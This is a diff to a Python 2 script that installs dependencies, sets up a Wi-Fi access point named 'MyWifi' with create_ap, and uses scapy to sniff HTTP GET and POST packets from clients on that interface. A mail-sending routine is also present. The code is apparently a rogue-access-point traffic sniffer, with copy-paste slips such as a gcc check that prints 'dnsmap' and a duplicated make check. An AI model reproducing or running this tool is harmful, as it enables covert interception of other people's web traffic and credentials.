@@ -31,6 +31,26 @@ def checkInstall():
 	else:
 		print '[√] dnsmap has been installed.'
 
+	if not os.path.isfile('/usr/sbin/rfkill'):
+		install = raw_input('[?]  rfkill not found in /usr/sbin/rfkill, install now? [y/n] ')
+		if install == 'y':
+			os.system('apt-get -y install rfkill')
+		else:
+			sys.exit('[x] rfkill not found in /usr/sbin/rfkill')
+			return
+	else:
+		print '[√] rfkill has been installed.'
+
+	if not os.path.isfile('/usr/sbin/haveged'):
+		install = raw_input('[?]  haveged not found in /usr/sbin/haveged, install now? [y/n] ')
+		if install == 'y':
+			os.system('apt-get -y install haveged')
+		else:
+			sys.exit('[x] haveged not found in /usr/sbin/haveged')
+			return
+	else:
+		print '[√] haveged has been installed.'
+
 	if not os.path.isfile('/usr/bin/gcc'):
 		install = raw_input('[?]  dnsmap not found in /usr/bin/gcc, install now? [y/n] ')
 		if install == 'y':
@@ -40,6 +60,16 @@ def checkInstall():
 			return
 	else:
 		print '[√] gcc has been installed.'
+
+	if not os.path.isfile('/usr/bin/make'):
+		install = raw_input('[?]  make not found in /usr/bin/make, install now? [y/n] ')
+		if install == 'y':
+			os.system('apt-get -y install make')
+		else:
+			sys.exit('[x] make not found in /usr/bin/make')
+			return
+	else:
+		print '[√] make has been installed.'
 
 	if not os.path.isfile('/usr/bin/make'):
 		install = raw_input('[?]  make not found in /usr/bin/make, install now? [y/n] ')
@@ -123,14 +153,29 @@ def sendMail(receiver, title, body):
     s.login(sender, pwd)
     s.sendmail(sender, receiver, msg.as_string())
 
-    print 'The mail named %s to %s is sended successly.' % (title, receiver)
+    print '[*] The mail named %s to %s is sended successly.' % (title, receiver)
 
 def dosniff():
-	# sniff(iface = 'wlan0',prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
-	sniff(iface = 'wlan0',prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
+	sniff_iface = 'wlan1'
+	try:
+		sniff(iface = sniff_iface,prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
+		print '[√] Sniffing on '+sniff_iface+'!'
+	except Exception,e:
+		print '[x] Can not do sniff on %s! Please check!' % sniff_iface
 
 def createAP():
-	cproc = subprocess.Popen(["create_ap","wlx00e02c313904","wlan0","1205","13509353772","-g","192.168.0.1","--dhcp-dns","8.8.8.8","--no-virt"],stderr=subprocess.PIPE,stdout=subprocess.PIPE)
+	net_iface = 'wlan0'
+	ap_iface = 'wlan1'
+	ap_ssid = 'MyWifi'
+	ap_key = '12345678'
+	ap_getway = '192.168.0.1'
+	ap_dns = '8.8.8.8'
+	try:
+		cproc = subprocess.Popen(["create_ap",ap_iface,net_iface,ap_ssid,ap_key,"-g",ap_getway,"--dhcp-dns",ap_dns,"--no-virt"],stderr=subprocess.PIPE,stdout=subprocess.PIPE)
+		print '[√] Created AP {"SSID":%s,"KEY":%s} on %s success!\n' % (ap_ssid,ap_key,ap_iface)
+	except Exception,e:
+		print e
+		sys.exit('[x] Create AP failed! Please check!')
 
 if __name__ == '__main__':
 	print "================================================="
@@ -141,10 +186,10 @@ if __name__ == '__main__':
 
 	print '\n[*] Checking required...\n'
 	checkInstall()
-	print '\n[*] Checking required finished !'
+	print '\n[*] Required checked!\n'
 
-	print '[*] Create a AP!\n'
+	print '[*] Creating an AP!'
 	createAP()
 
-	print '[*] Start sniff!\n'
+	print '[*] Start sniff!'
 	dosniff()
